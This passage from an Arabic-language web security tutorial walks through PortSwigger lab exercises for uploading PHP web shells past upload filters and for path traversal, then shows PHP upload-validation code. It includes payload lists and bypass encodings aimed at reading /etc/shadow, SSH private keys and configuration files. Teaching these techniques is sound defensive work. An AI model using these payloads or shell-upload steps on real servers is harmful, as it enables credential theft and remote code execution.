                        https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass
                    </a>
                </div>
                <p><strong>الهدف:</strong> تجاوز فحص Content-Type لرفع PHP shell.</p>
                
                <ol class="step-list">
                    <li>أنشئ exploit.php واحاول رفعه</li>
                    <li>لاحظ رسالة الخطأ حول MIME type</li>
                    <li>في Burp Repeater، غير Content-Type إلى image/jpeg</li>
                    <li>أرسل الطلب ولاحظ نجاح الرفع</li>
                    <li>اطلب الملف للحصول على النتيجة</li>
                </ol>
            </div>

            <!-- Lab 3 -->
            <div class="lab-card">
                <div class="lab-title">
                    <i class="fas fa-play"></i>
                    Lab 3: Web shell upload via path traversal
                </div>
                <div class="lab-url">
                    <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal" target="_blank" style="color: #64b5f6; text-decoration: none;">
                        <i class="fas fa-external-link-alt"></i>
                        https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal
                    </a>
                </div>
                <p><strong>الهدف:</strong> استخدام Path Traversal لرفع الملف في مجلد قابل للتنفيذ.</p>
                
                <ol class="step-list">
                    <li>ارفع exploit.php ولاحظ أنه لا يتم تنفيذه</li>
                    <li>في Repeater، غير filename إلى: <code>../exploit.php</code></li>
                    <li>لاحظ أن الخادم يزيل ../ من الاسم</li>
                    <li>استخدم URL encoding: <code>..%2fexploit.php</code></li>
                    <li>اطلب الملف من /files/exploit.php</li>
                    <li>احصل على المحتوى السري</li>
                </ol>
            </div>

            <!-- Lab 4 -->
            <div class="lab-card">
                <div class="lab-title">
                    <i class="fas fa-play"></i>
                    Lab 4: Web shell upload via extension blacklist bypass
                </div>
                <div class="lab-url">
                    <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass" target="_blank" style="color: #64b5f6; text-decoration: none;">
                        <i class="fas fa-external-link-alt"></i>
                        https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass
                    </a>
                </div>
                <p><strong>الهدف:</strong> تجاوز القائمة السوداء للامتدادات باستخدام .htaccess.</p>
                
                <ol class="step-list">
                    <li>احاول رفع exploit.php ولاحظ منع الامتداد</li>
                    <li>أنشئ ملف .htaccess بالمحتوى: <code>AddType application/x-httpd-php .l33t</code></li>
                    <li>ارفع .htaccess أولاً</li>
                    <li>غير اسم exploit.php إلى exploit.l33t</li>
                    <li>ارفع exploit.l33t</li>
                    <li>اطلب الملف وسيتم تنفيذه كـ PHP</li>
                </ol>
            </div>

            <!-- Lab 5 -->
            <div class="lab-card">
                <div class="lab-title">
                    <i class="fas fa-play"></i>
                    Lab 5: Web shell upload via obfuscated file extension
                </div>
                <div class="lab-url">
                    <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension" target="_blank" style="color: #64b5f6; text-decoration: none;">
                        <i class="fas fa-external-link-alt"></i>
                        https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension
                    </a>
                </div>
                <p><strong>الهدف:</strong> استخدام Null Byte لتجاوز فحص الامتداد.</p>
                
                <ol class="step-list">
                    <li>احاول رفع exploit.php ولاحظ رفض JPG/PNG فقط</li>
                    <li>في Repeater، غير filename إلى: <code>exploit.php%00.jpg</code></li>
                    <li>أرسل الطلب ولاحظ نجاح الرفع كـ exploit.php</li>
                    <li>اطلب exploit.php للحصول على النتيجة</li>
                </ol>
            </div>

            <!-- Lab 6 -->
            <div class="lab-card">
                <div class="lab-title">
                    <i class="fas fa-play"></i>
                    Lab 6: Web shell upload via race condition
                </div>
                <div class="lab-url">
                    <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition" target="_blank" style="color: #64b5f6; text-decoration: none;">
                        <i class="fas fa-external-link-alt"></i>
                        https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition
                    </a>
                </div>
                <p><strong>الهدف:</strong> استغلال Race Condition لتنفيذ الملف قبل حذفه.</p>
                
                <ol class="step-list">
                    <li>أنشئ polyglot PHP/JPG file</li>
                    <li>ارفع الملف ولاحظ أنه يتم حذفه بسرعة</li>
                    <li>استخدم Burp Intruder لإرسال طلبات متزامنة</li>
                    <li>طلب رفع + طلب تنفيذ في نفس الوقت</li>
                    <li>نجح في الحصول على النتيجة قبل الحذف</li>
                </ol>
            </div>

            <!-- Lab 7 -->
            <div class="lab-card">
                <div class="lab-title">
                    <i class="fas fa-play"></i>
                    Lab 7: Web shell upload via PUT method
                </div>
                <div class="lab-url">
                    <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-put-method" target="_blank" style="color: #64b5f6; text-decoration: none;">
                        <i class="fas fa-external-link-alt"></i>
                        https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-PUT-method
                    </a>
                </div>
                <p><strong>الهدف:</strong> استخدام HTTP PUT لرفع Web Shell.</p>
                
                <ol class="step-list">
                    <li>اكتشف أن الخادم يدعم PUT method</li>
                    <li>استخدم OPTIONS لتأكيد دعم PUT</li>
                    <li>أرسل PUT request مع PHP shell</li>
                    <li>PUT /shell.php مع المحتوى الخبيث</li>
                    <li>اطلب الملف المرفوع للتنفيذ</li>
                </ol>
            </div>
        </div>

        <!-- أساسيات Path Traversal -->
        <div id="path-traversal-basics" class="section">
            <h2 class="section-title"><i class="fas fa-folder-open"></i> أساسيات Path Traversal</h2>

            <div class="highlight-box">
                <h4><i class="fas fa-question-circle"></i> ما هو Path Traversal؟</h4>
                <p>Path Traversal (Directory Traversal) هي ثغرة تسمح للمهاجمين بالوصول للملفات والمجلدات خارج الدليل المخصص للتطبيق، مما يتيح قراءة الملفات الحساسة على الخادم.</p>
            </div>

            <h3 class="subsection-title"><i class="fas fa-cogs"></i> آلية عمل Path Traversal</h3>
            
            <div class="payload-box">
                <strong>طلب عادي:</strong><br>
                <code>GET /images?filename=product.jpg HTTP/1.1</code><br><br>
                <strong>طلب خبيث:</strong><br>
                <code>GET /images?filename=../../../etc/passwd HTTP/1.1</code>
            </div>

            <div class="attack-flow">
                <div class="attack-step">طلب ملف عادي</div>
                <span class="arrow">→</span>
                <div class="attack-step">إضافة ../</div>
                <span class="arrow">→</span>
                <div class="attack-step">الخروج من المجلد</div>
                <span class="arrow">→</span>
                <div class="attack-step">الوصول للملفات الحساسة</div>
            </div>

            <h3 class="subsection-title"><i class="fas fa-file-alt"></i> الملفات الحساسة المستهدفة</h3>
            
            <div class="tips-box">
                <h4><i class="fas fa-bullseye"></i> ملفات Linux الحساسة</h4>
                <ul>
                    <li><code>/etc/passwd</code> - معلومات المستخدمين</li>
                    <li><code>/etc/shadow</code> - كلمات المرور المشفرة</li>
                    <li><code>/etc/hosts</code> - ملف الـ hosts</li>
                    <li><code>/var/log/apache2/access.log</code> - ملفات الـ logs</li>
                    <li><code>/home/user/.ssh/id_rsa</code> - مفاتيح SSH</li>
                </ul>
            </div>

            <div class="tips-box">
                <h4><i class="fas fa-bullseye"></i> ملفات Windows الحساسة</h4>
                <ul>
                    <li><code>C:\Windows\System32\drivers\etc\hosts</code></li>
                    <li><code>C:\Windows\boot.ini</code></li>
                    <li><code>C:\inetpub\wwwroot\web.config</code></li>
                    <li><code>C:\Windows\win.ini</code></li>
                </ul>
            </div>
        </div>

        <!-- أنواع Path Traversal -->
        <div id="path-traversal-types" class="section">
            <h2 class="section-title"><i class="fas fa-route"></i> أنواع هجمات Path Traversal</h2>

            <h3 class="subsection-title"><i class="fas fa-arrow-up"></i> 1. Simple Path Traversal</h3>
            <div class="highlight-box">
                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
                <p><strong>ثغرة Simple Path Traversal</strong> هي الشكل الأساسي لهجمات Directory Traversal، حيث يستغل المهاجم الرموز <code>../</code> للتنقل خارج المجلد المسموح والوصول إلى ملفات النظام الحساسة. هذه الثغرة تحدث عندما يفشل التطبيق في تطهير أو فلترة مدخلات المستخدم بشكل صحيح.</p>
                
                <p><strong>الآلية التقنية الداخلية:</strong></p>
                <ul>
                    <li><strong>Parent Directory Navigation:</strong> استخدام <code>../</code> للانتقال إلى المجلد الأب</li>
                    <li><strong>Path Resolution:</strong> نظام التشغيل يحل المسار نسبياً من الموقع الحالي</li>
                    <li><strong>Access Control Bypass:</strong> تجاوز قيود الوصول المفروضة على المجلدات</li>
                    <li><strong>File System Traversal:</strong> استكشاف بنية نظام الملفات</li>
                </ul>

                <p><strong>سيناريوهات الهجوم المتدرجة:</strong></p>

                <div class="payload-box">
                    <strong>المرحلة 1 - استطلاع أولي:</strong><br>
                    <code>// اختبار عدد المستويات المطلوبة<br>
                    ../etc/passwd           // مستوى واحد<br>
                    ../../etc/passwd        // مستويان<br>
                    ../../../etc/passwd     // ثلاثة مستويات<br>
                    ../../../../etc/passwd  // أربعة مستويات</code>
                </div>

                <div class="payload-box">
                    <strong>المرحلة 2 - استخراج ملفات النظام:</strong><br>
                    <code>// Linux/Unix Systems<br>
                    ../../../etc/passwd     // قائمة المستخدمين<br>
                    ../../../etc/shadow     // كلمات المرور المشفرة<br>
                    ../../../etc/group      // مجموعات المستخدمين<br>
                    ../../../etc/hosts      // DNS المحلي<br>
                    ../../../proc/version   // معلومات النظام<br>
                    ../../../proc/cmdline   // معاملات التشغيل</code>
                </div>

                <div class="payload-box">
                    <strong>المرحلة 3 - استخراج ملفات التطبيق:</strong><br>
                    <code>// Web Application Files<br>
                    ../../../var/www/html/config.php    // إعدادات قاعدة البيانات<br>
                    ../../../var/log/apache2/access.log // سجلات الوصول<br>
                    ../../../var/log/apache2/error.log  // سجلات الأخطاء<br>
                    ../../../home/user/.ssh/id_rsa      // مفاتيح SSH<br>
                    ../../../home/user/.bash_history    // تاريخ الأوامر</code>
                </div>

                <p><strong>التأثير الأمني الشامل:</strong></p>
                <ul>
                    <li><strong>Information Disclosure:</strong> كشف معلومات النظام والمستخدمين</li>
                    <li><strong>Credential Harvesting:</strong> الحصول على كلمات المرور والمفاتيح</li>
                    <li><strong>System Reconnaissance:</strong> استطلاع بنية النظام والتطبيقات</li>
                    <li><strong>Privilege Escalation Preparation:</strong> جمع معلومات لرفع الصلاحيات</li>
                </ul>
            </div>

            <h3 class="subsection-title"><i class="fas fa-shield-alt"></i> 2. Absolute Path Bypass</h3>
            <div class="highlight-box">
                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
                <p><strong>تقنية Absolute Path Bypass</strong> تستغل ضعف في آليات الحماية التي تحاول منع استخدام <code>../</code> فقط، لكنها تتجاهل المسارات المطلقة. هذه التقنية فعالة جداً عندما يحاول المطورون حماية التطبيق من Path Traversal بطرق سطحية.</p>
                
                <p><strong>الفهم العميق للتقنية:</strong></p>
                <ul>
                    <li><strong>Root Directory Access:</strong> البدء مباشرة من الجذر <code>/</code></li>
                    <li><strong>Filter Bypass:</strong> تجاوز الفلاتر التي تبحث عن <code>../</code> فقط</li>
                    <li><strong>Direct Path Specification:</strong> تحديد المسار الكامل للملف المطلوب</li>
                    <li><strong>Operating System Agnostic:</strong> تعمل على معظم أنظمة التشغيل</li>
                </ul>

                <p><strong>سيناريوهات الهجوم المتقدمة:</strong></p>

                <div class="payload-box">
                    <strong>Linux/Unix Systems - ملفات النظام الأساسية:</strong><br>
                    <code>/etc/passwd                    // معلومات المستخدمين<br>
                    /etc/shadow                    // كلمات المرور المشفرة<br>
                    /etc/group                     // مجموعات النظام<br>
                    /etc/hosts                     // إعدادات DNS المحلي<br>
                    /etc/resolv.conf               // إعدادات DNS<br>
                    /etc/ssh/sshd_config           // إعدادات SSH<br>
                    /etc/apache2/sites-available/default  // إعدادات Apache</code>
                </div>

                <div class="payload-box">
                    <strong>System Information & Logs:</strong><br>
                    <code>/proc/version                  // معلومات الكيرنل<br>
                    /proc/cpuinfo                  // معلومات المعالج<br>
                    /proc/meminfo                  // معلومات الذاكرة<br>
                    /proc/mounts                   // نقاط التحميل<br>
                    /var/log/syslog                // سجل النظام<br>
                    /var/log/auth.log              // سجل المصادقة<br>
                    /var/log/apache2/access.log    // سجل الوصول</code>
                </div>

                <div class="payload-box">
                    <strong>Application & User Files:</strong><br>
                    <code>/var/www/html/config.php      // إعدادات التطبيق<br>
                    /var/www/html/.htaccess        // إعدادات Apache<br>
                    /home/user/.bash_history       // تاريخ الأوامر<br>
                    /home/user/.ssh/id_rsa         // مفتاح SSH الخاص<br>
                    /home/user/.ssh/authorized_keys // المفاتيح المصرح بها<br>
                    /root/.mysql_history           // تاريخ MySQL</code>
                </div>

                <p><strong>استراتيجيات الاستغلال المتقدمة:</strong></p>
                <ul>
                    <li><strong>Configuration File Hunting:</strong> البحث عن ملفات الإعداد التي تحتوي على كلمات مرور</li>
                    <li><strong>Log File Analysis:</strong> تحليل ملفات السجل لاكتشاف أنماط الاستخدام</li>
                    <li><strong>Backup File Discovery:</strong> البحث عن ملفات النسخ الاحتياطية</li>
                    <li><strong>Key Material Extraction:</strong> استخراج المفاتيح والشهادات</li>
                </ul>
            </div>

            <h3 class="subsection-title"><i class="fas fa-code"></i> 3. URL Encoding Bypass</h3>
            <div class="highlight-box">
                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
                <p><strong>تقنية URL Encoding Bypass</strong> تستغل الطريقة التي تتعامل بها التطبيقات مع URL decoding في مراحل مختلفة من معالجة الطلب. المشكلة تكمن في أن الفلترة قد تحدث قبل أو بعد عملية URL decoding، مما يتيح للمهاجم تجاوز الحماية.</p>
                
                <p><strong>فهم عملية URL Decoding:</strong></p>
                <ul>
                    <li><strong>Multi-Stage Processing:</strong> الطلب يمر بعدة مراحل معالجة</li>
                    <li><strong>Decoding Timing:</strong> قد يحدث decoding قبل أو بعد الفلترة</li>
                    <li><strong>Character Set Confusion:</strong> تفسير مختلف للحروف المشفرة</li>
                    <li><strong>Parser Inconsistencies:</strong> اختلاف في تحليل البيانات المشفرة</li>
                </ul>

                <p><strong>التصنيف الشامل لتقنيات التشفير:</strong></p>

                <div class="payload-box">
                    <strong>1. Standard URL Encoding:</strong><br>
                    <code>../../../etc/passwd           // الشكل الأصلي<br>
                    %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd   // مشفر بالكامل<br>
                    %2e%2e/%2e%2e/%2e%2e/etc/passwd  // مشفر جزئياً<br>
                    ..%2f..%2f..%2fetc%2fpasswd      // slash فقط مشفر</code>
                </div>

                <div class="payload-box">
                    <strong>2. Double URL Encoding:</strong><br>
                    <code>%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd<br>
                    // شرح: %25 = % مشفر، لذا %252e = %.2e = ..<br>
                    %252e%252e%252f = ../ بعد double decoding</code>
                </div>

                <div class="payload-box">
                    <strong>3. Unicode/UTF-8 Overlong Encoding:</strong><br>
                    <code>%c0%ae%c0%ae%c0%af              // ../ في UTF-8 overlong<br>
                    %e0%80%ae%e0%80%ae%e0%80%af      // ../ في UTF-8 triple byte<br>
                    %c1%9c%c1%9c%c1%1c              // ../ بطريقة أخرى</code>
                </div>

                <div class="payload-box">
                    <strong>4. Mixed Case Hex Encoding:</strong><br>
                    <code>%2E%2E%2F                     // حروف كبيرة<br>
                    %2e%2E%2f                     // مختلطة<br>
                    %2E%2e%2F                     // متنوعة</code>
                </div>

                <p><strong>تقنيات التجاوز المتقدمة:</strong></p>

                <div class="payload-box">
                    <strong>Testing Strategy لكشف التقنية الفعالة:</strong><br>
                    <code>// اختبار تدريجي<br>
                    1. ../../../etc/passwd         // Standard<br>
                    2. %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd  // Single encoding<br>
                    3. %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd // Double<br>
                    4. %c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd // Unicode<br>
                    5. مزج التقنيات المختلفة</code>
                </div>
            </div>

            <h3 class="subsection-title"><i class="fas fa-cut"></i> 4. Non-Recursive Filter Bypass</h3>
            <div class="highlight-box">
                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
                <p><strong>ثغرة Non-Recursive Filter Bypass</strong> تستغل عيباً شائعاً في تصميم آليات الحماية، حيث يقوم التطبيق بإزالة أو استبدال النصوص الخطيرة مرة واحدة فقط، دون التحقق من وجود نصوص خطيرة جديدة قد تتكون بعد عملية الإزالة الأولى.</p>
                
                <p><strong>فهم آلية الفشل في الفلترة:</strong></p>
                <ul>
                    <li><strong>Single Pass Filtering:</strong> الفلتر يعمل مرة واحدة فقط</li>
                    <li><strong>String Reconstruction:</strong> النصوص المتبقية تتحد لتكوين payload خطير</li>
                    <li><strong>Pattern Reformation:</strong> الأنماط المحظورة تتشكل من جديد</li>
                    <li><strong>Developer Assumption:</strong> افتراض خاطئ أن مرة واحدة كافية</li>
                </ul>

                <p><strong>أمثلة تفصيلية لآلية العمل:</strong></p>

                <div class="payload-box">
                    <strong>المثال الأساسي - إزالة "../":</strong><br>
                    <code>// الـ payload الأصلي<br>
                    ....//....//....//etc/passwd<br><br>

                    // الخطوة 1: الفلتر يزيل "../" الأولى<br>
                    ....//....//....//etc/passwd → ..//....//....//etc/passwd<br><br>

                    // النتيجة النهائية (مازال خطير!)<br>
                    //....//....//etc/passwd → ../../../etc/passwd</code>
                </div>

                <div class="payload-box">
                    <strong>تقنيات Nested Patterns المتقدمة:</strong><br>
                    <code>..../                          // يصبح ../ بعد إزالة ../<br>
                    ....\                          // للأنظمة التي تدعم \<br>
                    ....\/                         // مزج / و \<br>
                    ....//                         // double slash<br>
                    ..../\                         // مزج separators</code>
                </div>

                <div class="payload-box">
                    <strong>تقنية الـ Nested Removal:</strong><br>
                    <code>// بعض التطبيقات تحاول إزالة الامتدادات الخطيرة، لكن تفعل ذلك مرة واحدة فقط:<br>
                    ....//....//....//etc/passwd   // يصبح ../../../etc/passwd<br>
                    ......///......///......///etc/passwd // triple nesting<br>
                    ..../\..../\..../\etc/passwd   // mixed separators</code>
                </div>
            </div>

            <h3 class="subsection-title"><i class="fas fa-check-circle"></i> 5. Start Path Validation Bypass</h3>
            <div class="highlight-box">
                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
                <p><strong>ثغرة Start Path Validation Bypass</strong> تستغل عيباً في آليات التحقق التي تفحص بداية المسار فقط، لكنها تفشل في التحقق من المسار بالكامل بعد معالجته. هذا النوع من الثغرات شائع في التطبيقات التي تحاول تقييد الوصول لمجلدات معينة فقط.</p>
                
                <p><strong>فهم آلية فشل التحقق:</strong></p>
                <ul>
                    <li><strong>Prefix Validation Only:</strong> التحقق من بداية المسار فقط</li>
                    <li><strong>Path Resolution After Validation:</strong> معالجة المسار تحدث بعد التحقق</li>
                    <li><strong>Trusted Prefix Assumption:</strong> افتراض أن البداية الصحيحة تضمن الأمان</li>
                    <li><strong>Post-Processing Vulnerability:</strong> الثغرة تظهر بعد المعالجة</li>
                </ul>

                <p><strong>سيناريوهات الهجوم التفصيلية:</strong></p>

                <div class="payload-box">
                    <strong>السيناريو الأساسي - Web Root Escape:</strong><br>
                    <code>// التحقق: هل المسار يبدأ بـ /var/www/html؟ ✓<br>
                    /var/www/html/../../../etc/passwd<br><br>

                    // بعد Path Resolution:<br>
                    /var/www/html/../../../etc/passwd → /etc/passwd<br><br>

                    // النتيجة: تجاوز التحقق والوصول لملف النظام!</code>
                </div>

                <div class="payload-box">
                    <strong>Application Directory Bypass:</strong><br>
                    <code>// إذا كان التطبيق يسمح بالوصول لـ /app/uploads فقط<br>
                    /app/uploads/../../../etc/passwd<br>
                    /app/uploads/../../../var/log/apache2/access.log<br>
                    /app/uploads/../../../home/user/.ssh/id_rsa<br><br>

                    // أو للـ configuration files<br>
                    /app/uploads/../config/database.php<br>
                    /app/uploads/../.env</code>
                </div>

                <p><strong>تأثيرات الأمان المتقدمة:</strong></p>
                <ul>
                    <li><strong>System Compromise:</strong> السيطرة الكاملة على النظام</li>
                    <li><strong>Service Disruption:</strong> تعطيل الخدمات عبر الكتابة فوق الملفات</li>
                    <li><strong>Privilege Escalation:</strong> رفع الصلاحيات عبر تعديل ملفات النظام</li>
                    <li><strong>Data Integrity Loss:</strong> فقدان سلامة البيانات</li>
                </ul>
            </div>

            <h3 class="subsection-title"><i class="fas fa-file-image"></i> 6. Null Byte Injection</h3>
            <div class="highlight-box">
                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
                <p><strong>ثغرة Null Byte Injection</strong> تستغل اختلاف طريقة التعامل مع Null bytes بين اللغات عالية المستوى (مثل PHP, Python) واللغات منخفضة المستوى (مثل C, C++). هذه الثغرة خطيرة جداً لأنها تتيح تجاوز فحص امتدادات الملفات والمسارات.</p>
                
                <p><strong>الفهم العميق لآلية العمل:</strong></p>
                <ul>
                    <li><strong>String Termination:</strong> Null byte يعتبر نهاية string في C/C++</li>
                    <li><strong>Language Inconsistency:</strong> لغات مختلفة تتعامل مع null bytes بشكل مختلف</li>
                    <li><strong>System Call Interface:</strong> استدعاءات النظام تتوقف عند null byte</li>
                    <li><strong>Input Validation Bypass:</strong> تجاوز آليات التحقق من المدخلات</li>
                </ul>

                <p><strong>السيناريوهات التقنية المفصلة:</strong></p>

                <div class="payload-box">
                    <strong>Extension Validation Bypass:</strong><br>
                    <code>// السيناريو: التطبيق يقبل .jpg فقط<br>
                    ../../../etc/passwd%00.jpg<br><br>

                    // ما يراه التطبيق (PHP):<br>
                    "../../../etc/passwd\0.jpg" → امتداد .jpg ✓<br><br>

                    // ما يراه نظام التشغيل (C library):<br>
                    "../../../etc/passwd" → يتوقف عند \0</code>
                </div>

                <div class="payload-box">
                    <strong>تشفير Null Byte في بروتوكولات مختلفة:</strong><br>
                    <code>%00                            // Standard URL encoding<br>
                    %u0000                         // Unicode URL encoding<br>
                    \x00                           // Hex representation<br>
                    \0                             // C-style null<br>
                    %c0%80                         // UTF-8 overlong encoding</code>
                </div>

                <div class="payload-box">
                    <strong>استغلال في سياقات مختلفة:</strong><br>
                    <code>// File Upload Context<br>
                    shell.php%00.jpg               // يبدو كـ JPG للتطبيق<br>
                    backdoor.asp%00.gif            // يبدو كـ GIF للتطبيق<br><br>

                    // Path Traversal Context<br>
                    /var/log/apache2/access.log%00.php<br>
                    /etc/passwd%00.txt<br>
                    /home/user/.ssh/id_rsa%00.key</code>
                </div>

                <p><strong>Modern Mitigations والتجاوز:</strong></p>
                <ul>
                    <li><strong>PHP 5.3.4+:</strong> إصلاح null byte injection في معظم الحالات</li>
                    <li><strong>Modern Frameworks:</strong> حماية أفضل ضد null bytes</li>
                    <li><strong>Still Vulnerable:</strong> تطبيقات قديمة، custom implementations</li>
                    <li><strong>Alternative Injections:</strong> استخدام أحرف أخرى كبدائل</li>
                </ul>
            </div>
        </div>

        <!-- مختبرات Path Traversal -->
        <div id="path-traversal-labs" class="section">
            <h2 class="section-title"><i class="fas fa-vials"></i> مختبرات Path Traversal - 6 مختبرات</h2>

            <!-- Lab 1 -->
            <div class="lab-card">
                <div class="lab-title">
                    <i class="fas fa-play"></i>
                    Lab 1: File path traversal, simple case
                </div>
                <div class="lab-url">
                    <a href="https://portswigger.net/web-security/file-path-traversal/lab-simple" target="_blank" style="color: #64b5f6; text-decoration: none;">
                        <i class="fas fa-external-link-alt"></i>
                        https://portswigger.net/web-security/file-path-traversal/lab-simple
                    </a>
                </div>
                <p><strong>الهدف:</strong> استخراج محتوى ملف /etc/passwd باستخدام Path Traversal بسيط.</p>
                
                <ol class="step-list">
                    <li>استخدم Burp لاعتراض طلب جلب صورة منتج</li>
                    <li>غير معامل filename إلى: <code>../../../etc/passwd</code></li>
                    <li>أرسل الطلب ولاحظ محتوى ملف passwd في الاستجابة</li>
                </ol>
            </div>

            <!-- Lab 2 -->
            <div class="lab-card">
                <div class="lab-title">
                    <i class="fas fa-play"></i>
                    Lab 2: File path traversal, traversal sequences blocked with absolute path bypass
                </div>
                <div class="lab-url">
                    <a href="https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass" target="_blank" style="color: #64b5f6; text-decoration: none;">
                        <i class="fas fa-external-link-alt"></i>
                        https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass
                    </a>
                </div>
                <p><strong>الهدف:</strong> تجاوز حظر traversal sequences باستخدام المسار المطلق.</p>
                
                <ol class="step-list">
                    <li>احاول استخدام ../ ولاحظ أنه محظور</li>
                    <li>غير filename إلى المسار المطلق: <code>/etc/passwd</code></li>
                    <li>احصل على محتوى الملف مباشرة</li>
                </ol>
            </div>

            <!-- Lab 3 -->
            <div class="lab-card">
                <div class="lab-title">
                    <i class="fas fa-play"></i>
                    Lab 3: File path traversal, validation of start of path
                </div>
                <div class="lab-url">
                    <a href="https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path" target="_blank" style="color: #64b5f6; text-decoration: none;">
                        <i class="fas fa-external-link-alt"></i>
                        https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path
                    </a>
                </div>
                <p><strong>الهدف:</strong> تجاوز فحص بداية المسار المطلوبة.</p>
                
                <ol class="step-list">
                    <li>لاحظ أن التطبيق يتوقع بداية معينة للمسار</li>
                    <li>استخدم: <code>/var/www/images/../../../etc/passwd</code></li>
                    <li>ابدأ بالمسار المطلوب ثم انتقل للملف المستهدف</li>
                </ol>
            </div>

            <!-- Lab 4 -->
            <div class="lab-card">
                <div class="lab-title">
                    <i class="fas fa-play"></i>
                    Lab 4: File path traversal, traversal sequences stripped non-recursively
                </div>
                <div class="lab-url">
                    <a href="https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively" target="_blank" style="color: #64b5f6; text-decoration: none;">
                        <i class="fas fa-external-link-alt"></i>
                        https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively
                    </a>
                </div>
                <p><strong>الهدف:</strong> تجاوز الفلتر الذي يحذف ../ مرة واحدة فقط.</p>
                
                <ol class="step-list">
                    <li>احاول ../ ولاحظ أنه يتم حذفه</li>
                    <li>استخدم nested sequences: <code>....//....//....//etc/passwd</code></li>
                    <li>بعد حذف ../ الأولى، ستبقى ../ أخرى تعمل</li>
                </ol>
            </div>

            <!-- Lab 5 -->
            <div class="lab-card">
                <div class="lab-title">
                    <i class="fas fa-play"></i>
                    Lab 5: File path traversal, traversal sequences stripped with superfluous URL-decode
                </div>
                <div class="lab-url">
                    <a href="https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode" target="_blank" style="color: #64b5f6; text-decoration: none;">
                        <i class="fas fa-external-link-alt"></i>
                        https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode
                    </a>
                </div>
                <p><strong>الهدف:</strong> تجاوز الفلتر باستخدام Double URL Encoding.</p>
                
                <ol class="step-list">
                    <li>احاول ../ و %2e%2e%2f ولاحظ أنهما محظوران</li>
                    <li>استخدم Double URL encoding: <code>..%252f..%252f..%252fetc/passwd</code></li>
                    <li>الفلتر يفحص المدخل ثم يطبق URL decode مرة أخرى</li>
                </ol>
            </div>

            <!-- Lab 6 -->
            <div class="lab-card">
                <div class="lab-title">
                    <i class="fas fa-play"></i>
                    Lab 6: File path traversal, validation of file extension with null byte bypass
                </div>
                <div class="lab-url">
                    <a href="https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass" target="_blank" style="color: #64b5f6; text-decoration: none;">
                        <i class="fas fa-external-link-alt"></i>
                        https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass
                    </a>
                </div>
                <p><strong>الهدف:</strong> تجاوز فحص امتداد الملف باستخدام Null Byte.</p>
                
                <ol class="step-list">
                    <li>احاول ../../../etc/passwd ولاحظ رفض عدم وجود امتداد صورة</li>
                    <li>استخدم Null Byte: <code>../../../etc/passwd%00.png</code></li>
                    <li>الفحص يرى .png لكن النظام يتوقف عند %00</li>
                </ol>
            </div>
        </div>

        <!-- طرق الحماية -->
        <div id="prevention" class="section">
            <h2 class="section-title"><i class="fas fa-shield-virus"></i> طرق الحماية</h2>

            <h3 class="subsection-title"><i class="fas fa-upload"></i> حماية File Upload</h3>
            
            <div class="highlight-box">
                <h4><i class="fas fa-check-circle"></i> 1. فحص امتداد الملف (Whitelist)</h4>
                <div class="code-example secure-code">
                    <pre><code class="language-php">// حماية صحيحة
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
$file_extension = strtolower(pathinfo($_FILES['upload']['name'], PATHINFO_EXTENSION));

if (!in_array($file_extension, $allowed_extensions)) {
    die('نوع الملف غير مسموح');
}

// فحص MIME type إضافي
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime_type = finfo_file($finfo, $_FILES['upload']['tmp_name']);
$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];

if (!in_array($mime_type, $allowed_mimes)) {
    die('نوع الملف غير صحيح');
}</code></pre>
                </div>
            </div>

            <div class="highlight-box">
                <h4><i class="fas fa-check-circle"></i> 2. فحص محتوى الملف</h4>
                <div class="code-example secure-code">
                    <pre><code class="language-php">// التحقق من Magic Bytes
function isValidImage($file_path) {
    $handle = fopen($file_path, 'rb');
    $bytes = fread($handle, 4);
    fclose($handle);
    
    // JPEG: FF D8 FF
    // PNG: 89 50 4E 47
    // GIF: 47 49 46 38
    
    $jpeg = [0xFF, 0xD8, 0xFF];
    $png = [0x89, 0x50, 0x4E, 0x47];
    $gif = [0x47, 0x49, 0x46, 0x38];
    
    $file_bytes = unpack('C*', $bytes);
    
    return (array_slice($file_bytes, 0, 3) === $jpeg ||
            array_slice($file_bytes, 0, 4) === $png ||
            array_slice($file_bytes, 0, 4) === $gif);
}</code></pre>
                </div>
            </div>

            <div class="highlight-box">
